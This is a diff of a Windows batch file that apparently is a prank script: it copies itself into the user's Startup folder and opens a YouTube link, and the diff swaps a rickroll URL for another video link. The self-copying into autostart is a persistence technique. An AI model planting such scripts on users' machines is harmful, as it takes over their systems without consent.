@@ -7,6 +7,6 @@ pause
 
 ) else (
 copy /y %~f0 "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\"
-start "" https://www.youtube.com/watch?v=dQw4w9WgXcQ
+start "" https://youtu.be/xvFZjo5PgG0?si=7EvheP5qV0sNY2sa
 )
 cls
